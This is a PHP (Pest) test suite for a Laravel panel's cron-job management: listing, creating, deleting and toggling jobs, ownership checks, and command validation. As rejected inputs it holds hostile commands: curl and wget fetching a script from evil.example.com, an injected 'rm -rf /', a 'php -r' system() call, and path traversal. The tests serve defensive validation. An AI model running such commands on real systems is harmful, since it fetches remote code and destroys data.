<?php

use App\Models\CronJob;
use App\Models\Operation;
use App\Models\User;
use App\Services\CronJobs\CreateCronJobService;
use Illuminate\Support\Facades\Process;

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

function makeJob(User $user, string $scheduleSuffix = ''): CronJob
{
    static $counter = 0;
    $counter++;

    return CronJob::create([
        'user_id' => $user->id,
        'schedule' => '* * * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan inspire'.$counter.$scheduleSuffix,
        'active' => true,
    ]);
}

// ─────────────────────────────────────────────────────────────────────────────
// index
// ─────────────────────────────────────────────────────────────────────────────

test('GET /cron-jobs renders CronJobs/Index with cronJobs prop', function () {
    $user = User::factory()->isNotAdmin()->create();
    makeJob($user);

    $this->actingAs($user);

    $response = $this->withoutVite()->get('/cron-jobs');

    $response->assertStatus(200);
    $response->assertInertia(fn ($page) => $page
        ->component('CronJobs/Index')
        ->has('cronJobs', 1)
    );
});

test('GET /cron-jobs unauthenticated redirects to login', function () {
    $response = $this->get('/cron-jobs');

    $response->assertRedirect('/login');
});

test('GET /cron-jobs as non-admin sees only own jobs', function () {
    $user = User::factory()->isNotAdmin()->create();
    $other = User::factory()->isNotAdmin()->create();

    makeJob($user);
    makeJob($other);

    $this->actingAs($user);

    $response = $this->withoutVite()->get('/cron-jobs');

    $response->assertStatus(200);
    // Non-admin sees only their own 1 job, not the other user's.
    $response->assertInertia(fn ($page) => $page
        ->component('CronJobs/Index')
        ->has('cronJobs', 1)
    );
});

test('GET /cron-jobs as admin sees all users jobs', function () {
    $admin = User::factory()->isAdmin()->create();
    $user1 = User::factory()->isNotAdmin()->create();
    $user2 = User::factory()->isNotAdmin()->create();

    makeJob($user1);
    makeJob($user2);

    $this->actingAs($admin);

    $response = $this->withoutVite()->get('/cron-jobs');

    $response->assertStatus(200);
    $response->assertInertia(fn ($page) => $page
        ->component('CronJobs/Index')
        ->has('cronJobs', 2)
    );
});

// ─────────────────────────────────────────────────────────────────────────────
// store — happy path
// ─────────────────────────────────────────────────────────────────────────────

test('POST /cron-jobs valid data creates CronJob and Operation with status succeeded', function () {
    Process::fake();

    $user = User::factory()->isNotAdmin()->create(['username' => 'storetest']);

    $this->actingAs($user);

    $response = $this->post('/cron-jobs', [
        'schedule' => '0 2 * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan inspire',
        'label' => 'Daily job',
    ]);

    $response->assertRedirect(route('cron-jobs.index'));

    // CronJob row must exist
    $job = CronJob::where('user_id', $user->id)->first();
    expect($job)->not->toBeNull();
    expect($job->schedule)->toBe('0 2 * * *');
    expect($job->label)->toBe('Daily job');

    // Operation row with correct type and status
    $op = Operation::where('user_id', $user->id)->where('type', 'cron.create')->first();
    expect($op)->not->toBeNull();
    expect($op->status)->toBe('succeeded');
});

// ─────────────────────────────────────────────────────────────────────────────
// store — validation rejections
// ─────────────────────────────────────────────────────────────────────────────

test('POST /cron-jobs with invalid schedule returns 422', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'schedtest']);

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => 'not-a-cron',
        'command' => 'php /home/'.$user->systemUsername.'/artisan inspire',
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['schedule']);
});

test('POST /cron-jobs with disallowed command (wget) returns 422', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'wgettest']);

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => 'wget https://evil.example.com/script.sh',
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['command']);
});

test('POST /cron-jobs with disallowed command (curl) returns 422', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'curltest']);

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => 'curl https://evil.example.com/script.sh',
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['command']);
});

test('POST /cron-jobs with shell metacharacter in command returns 422', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'metaTest']);

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan foo; rm -rf /',
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['command']);
});

test('POST /cron-jobs returns 422 when 50-job cap is exceeded', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'captest']);

    // Fill up to the 50-job cap
    for ($i = 0; $i < 50; $i++) {
        CronJob::create([
            'user_id' => $user->id,
            'schedule' => '* * * * *',
            'command' => 'php /home/'.$user->systemUsername.'/artisan inspire'.$i,
        ]);
    }

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => '0 2 * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan new-job',
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['command']);
});

// ─────────────────────────────────────────────────────────────────────────────
// store — script failure
// ─────────────────────────────────────────────────────────────────────────────

test('POST /cron-jobs when script fails marks Operation failed and rolls back CronJob row', function () {
    Process::fake([
        '*' => Process::result(output: '', errorOutput: 'cron script error', exitCode: 1),
    ]);

    $user = User::factory()->isNotAdmin()->create(['username' => 'failtest']);

    $this->actingAs($user);

    $response = $this->post('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan inspire',
    ]);

    $response->assertRedirect(route('cron-jobs.index'));

    // CronJob row must NOT exist (transaction rolled back)
    expect(CronJob::where('user_id', $user->id)->exists())->toBeFalse();

    // Operation row must exist with status=failed
    $op = Operation::where('user_id', $user->id)->where('type', 'cron.create')->first();
    expect($op)->not->toBeNull();
    expect($op->status)->toBe('failed');
});

test('POST /cron-jobs marks Operation finished (not stuck) on an unexpected exception', function () {
    // Force an UNEXPECTED (non-domain) exception from the create service.
    $this->mock(CreateCronJobService::class, function ($mock) {
        $mock->shouldReceive('handle')->andThrow(new \RuntimeException('boom'));
    });

    $user = User::factory()->isNotAdmin()->create(['username' => 'throwtest']);

    $response = $this->actingAs($user)->post('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan inspire',
    ]);

    $response->assertRedirect(route('cron-jobs.index'));
    $response->assertSessionHas('error');

    // The audit Operation must be finished (failed), never left stuck in 'running'.
    $op = Operation::where('user_id', $user->id)->where('type', 'cron.create')->first();
    expect($op)->not->toBeNull();
    expect($op->status)->not->toBe('running');
    expect($op->status)->toBe('failed');

    // Transaction rolled back — no CronJob row remains.
    expect(CronJob::where('user_id', $user->id)->exists())->toBeFalse();
});

// ─────────────────────────────────────────────────────────────────────────────
// destroy
// ─────────────────────────────────────────────────────────────────────────────

test('DELETE /cron-jobs/{cronJob} own job deletes row and creates succeeded Operation', function () {
    Process::fake();

    $user = User::factory()->isNotAdmin()->create(['username' => 'destroytest']);
    $job = makeJob($user);

    $this->actingAs($user);

    $response = $this->delete("/cron-jobs/{$job->id}");

    $response->assertRedirect(route('cron-jobs.index'));

    // DB row must be gone
    expect(CronJob::find($job->id))->toBeNull();

    // Operation row with correct type and status
    $op = Operation::where('user_id', $user->id)->where('type', 'cron.delete')->first();
    expect($op)->not->toBeNull();
    expect($op->status)->toBe('succeeded');
});

test('DELETE /cron-jobs/{cronJob} by non-owner returns 403 and leaves row intact', function () {
    Process::fake();

    $owner = User::factory()->isNotAdmin()->create();
    $attacker = User::factory()->isNotAdmin()->create();
    $job = makeJob($owner);

    $this->actingAs($attacker);

    $response = $this->delete("/cron-jobs/{$job->id}");

    $response->assertStatus(403);
    expect(CronJob::find($job->id))->not->toBeNull();
});

// ─────────────────────────────────────────────────────────────────────────────
// toggleActive
// ─────────────────────────────────────────────────────────────────────────────

test('POST /cron-jobs/{cronJob}/toggle flips active and creates succeeded Operation', function () {
    Process::fake();

    $user = User::factory()->isNotAdmin()->create(['username' => 'toggletest']);
    $job = makeJob($user);
    expect($job->active)->toBeTrue();

    $this->actingAs($user);

    $response = $this->post("/cron-jobs/{$job->id}/toggle");

    $response->assertRedirect(route('cron-jobs.index'));

    // active must be flipped to false
    expect($job->fresh()->active)->toBeFalse();

    // Operation row with correct type and status
    $op = Operation::where('user_id', $user->id)->where('type', 'cron.toggle')->first();
    expect($op)->not->toBeNull();
    expect($op->status)->toBe('succeeded');
});

test('POST /cron-jobs/{cronJob}/toggle flips inactive job to active', function () {
    Process::fake();

    $user = User::factory()->isNotAdmin()->create(['username' => 'toggletest2']);
    $job = CronJob::create([
        'user_id' => $user->id,
        'schedule' => '* * * * *',
        'command' => 'php /home/'.$user->systemUsername.'/artisan inspire',
        'active' => false,
    ]);

    $this->actingAs($user);

    $response = $this->post("/cron-jobs/{$job->id}/toggle");

    $response->assertRedirect(route('cron-jobs.index'));

    expect($job->fresh()->active)->toBeTrue();
});

test('POST /cron-jobs/{cronJob}/toggle by non-owner returns 403', function () {
    Process::fake();

    $owner = User::factory()->isNotAdmin()->create();
    $attacker = User::factory()->isNotAdmin()->create();
    $job = makeJob($owner);

    $this->actingAs($attacker);

    $response = $this->post("/cron-jobs/{$job->id}/toggle");

    $response->assertStatus(403);
    // active must remain unchanged
    expect($job->fresh()->active)->toBeTrue();
});

// ─────────────────────────────────────────────────────────────────────────────
// Security guard tests — HTTP layer (AllowedCronCommand guards via controller)
// ─────────────────────────────────────────────────────────────────────────────

test('POST /cron-jobs with php -r flag-smuggling returns 422', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'phprtestuser']);

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => "php -r 'system(\"id\");'",
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['command']);
});

test('POST /cron-jobs with php -f flag-smuggling returns 422', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'phpftestuser']);

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => 'php -f /home/'.$user->systemUsername.'/artisan',
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['command']);
});

test('POST /cron-jobs with path traversal outside homedir returns 422', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'pathtraversal']);

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => 'php /home/'.$user->systemUsername.'/../other_ln/artisan',
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['command']);
});

test('POST /cron-jobs with path outside own homedir (other user) returns 422', function () {
    $user = User::factory()->isNotAdmin()->create(['username' => 'pathscope']);
    $other = User::factory()->isNotAdmin()->create(['username' => 'otherusr']);

    $this->actingAs($user);

    $response = $this->postJson('/cron-jobs', [
        'schedule' => '* * * * *',
        'command' => 'php /home/'.$other->systemUsername.'/artisan inspire',
    ]);

    $response->assertStatus(422);
    $response->assertJsonValidationErrors(['command']);
});
